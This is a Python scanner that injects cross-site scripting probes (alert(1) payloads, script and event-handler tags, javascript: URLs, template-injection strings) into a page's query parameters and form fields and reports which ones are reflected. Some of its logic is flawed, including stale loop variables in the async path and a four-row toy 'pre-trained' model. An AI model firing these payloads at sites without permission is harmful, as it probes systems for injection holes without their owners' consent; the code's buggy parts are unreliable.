import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import concurrent.futures
import aiohttp
import asyncio
import logging
import time
import pandas as pd
import plotly.express as px
from sklearn.ensemble import RandomForestClassifier

# Configure logging
logging.basicConfig(filename='reflected_value_tester.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def generate_payloads(context):
    """Generate payloads based on the context."""
    if context == "html":
        return [
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<script>alert(1)</script>"
        ]
    elif context == "javascript":
        return [
            "';alert(1);//",
            '";alert(1);//',
            "alert(1)"
        ]
    elif context == "url":
        return [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>"
        ]
    else:
        return ["MrColonel"]  # Default payload

def generate_fuzz_strings():
    """Generate a list of fuzz strings."""
    return [
        "'", '"', "<", ">", "&", "%", "\\", "/", "=",
        "javascript:alert(1)",
        "{{7*7}}",  # Template injection
        "\u2028", "\u2029",  # Unicode line separators
        "A" * 1000  # Long string
    ]

def predict_best_payload(context):
    """Predict the best payload for a given context using a pre-trained model."""
    # Example training data
    data = {
        'context': ['html', 'javascript', 'url', 'html'],
        'payload': ['<img src=x onerror=alert(1)>', "';alert(1);//", "javascript:alert(1)", "<script>alert(1)</script>"],
        'success': [1, 1, 0, 1]  # 1 = success, 0 = failure
    }

    # Train a model
    df = pd.DataFrame(data)
    X = pd.get_dummies(df[['context', 'payload']])
    y = df['success']
    model = RandomForestClassifier()
    model.fit(X, y)

    # Predict the best payload
    payloads = generate_payloads(context)
    predictions = []
    for payload in payloads:
        X_test = pd.get_dummies(pd.DataFrame([{'context': context, 'payload': payload}]))
        X_test = X_test.reindex(columns=X.columns, fill_value=0)
        predictions.append(model.predict_proba(X_test)[0][1])  # Probability of success
    return payloads[predictions.index(max(predictions))]

def retry_request(url, max_retries=3, delay=1):
    """Retry a request with exponential backoff."""
    for i in range(max_retries):
        try:
            response = requests.get(url)
            return response
        except Exception as e:
            logging.error(f"Attempt {i + 1} failed: {e}")
            time.sleep(delay * (2 ** i))  # Exponential backoff
    return None

async def test_form_input_async(session, input_tag, form_action, form_method, form_data):
    """Test a form input asynchronously."""
    try:
        if form_method == 'GET':
            async with session.get(form_action, params=form_data) as response:
                return await response.text()
        else:
            async with session.post(form_action, data=form_data) as response:
                return await response.text()
    except Exception as e:
        logging.error(f"Error testing form input: {e}")
        return None

async def test_reflected_values_async(driver, base_domain):
    """Test reflected values asynchronously."""
    reflected_values = []
    test_strings = generate_payloads("html")  # Example: HTML context

    async with aiohttp.ClientSession() as session:
        tasks = []
        for input_tag in driver.find_elements(By.TAG_NAME, "input"):
            if input_tag.get_attribute('name'):
                for test_string in test_strings:
                    form = input_tag.find_element(By.XPATH, "./ancestor::form")
                    form_action = form.get_attribute('action') or driver.current_url
                    form_method = form.get_attribute('method').upper()
                    form_data = {input_tag.get_attribute('name'): test_string}
                    tasks.append(test_form_input_async(session, input_tag, form_action, form_method, form_data))

        results = await asyncio.gather(*tasks)
        for result in results:
            if result and any(test_string in result for test_string in test_strings):
                reflected_values.append({
                    'url': form_action,
                    'key': input_tag.get_attribute('name'),
                    'reflected': True,
                    'payload': test_string
                })

    return reflected_values

def generate_report(reflected_values):
    """Generate an HTML report with visualizations."""
    df = pd.DataFrame(reflected_values)
    fig = px.bar(df, x='key', y='reflected', color='payload', title='Reflected Values')
    fig.write_html("report.html")

def test_reflected_values(driver, base_domain):
    """Test all parameters for reflected values using advanced techniques."""
    reflected_values = []
    test_strings = generate_payloads("html")  # Example: HTML context

    try:
        # Get the current page source
        soup = BeautifulSoup(driver.page_source, 'html.parser')

        # Test query parameters
        query_params = urlparse(driver.current_url).query
        if query_params:
            for param in query_params.split('&'):
                key, value = param.split('=')
                for test_string in test_strings:
                    modified_url = driver.current_url.replace(f"{key}={value}", f"{key}={test_string}")
                    driver.get(modified_url)
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                    if test_string in driver.page_source:
                        reflected_values.append({
                            'url': modified_url,
                            'key': key,
                            'original_value': value,
                            'reflected': True,
                            'payload': test_string
                        })

        # Test form inputs
        def test_form_input(input_tag):
            if input_tag.get('name'):
                for test_string in test_strings:
                    input_tag['value'] = test_string
                    form = input_tag.find_parent('form')
                    if form:
                        form_action = form.get('action', driver.current_url)
                        form_method = form.get('method', 'GET').upper()
                        form_data = {input_tag['name']: test_string}

                        # Set custom headers
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 MrColonel',
                            'X-Researcher-Username': 'mrcolonel'
                        }

                        # Submit the form
                        if form_method == 'GET':
                            response = requests.get(urljoin(driver.current_url, form_action), params=form_data, headers=headers)
                        else:
                            response = requests.post(urljoin(driver.current_url, form_action), data=form_data, headers=headers)

                        # Check if the test string is reflected in the response
                        if test_string in response.text:
                            reflected_values.append({
                                'url': urljoin(driver.current_url, form_action),
                                'key': input_tag['name'],
                                'original_value': input_tag.get('value', ''),
                                'reflected': True,
                                'payload': test_string
                            })

        # Use multithreading to test form inputs in parallel
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(test_form_input, soup.find_all('input'))

    except Exception as e:
        logging.error(f"Error testing reflected values: {e}")

    # Generate a report
    generate_report(reflected_values)

    return reflected_values